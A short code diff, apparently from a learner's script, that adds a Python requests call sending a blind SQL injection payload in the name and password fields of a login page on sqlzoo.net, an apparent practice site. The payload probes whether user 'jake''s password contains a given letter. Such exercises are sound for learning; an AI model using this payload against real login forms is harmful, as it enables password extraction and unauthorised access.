@@ -29,3 +29,10 @@ br.open(url)
 name = "String" 
 password = "String"
 form = {"name" : name, "password" : password}
+
+
+# https://3.python-requests.org/user/quickstart/#passing-parameters-in-urls
+load = {"name" : "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='", "password" : "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='"}
+r = requests.get("https://sqlzoo.net/hack/passwd.pl", params = load)
+r.text
+
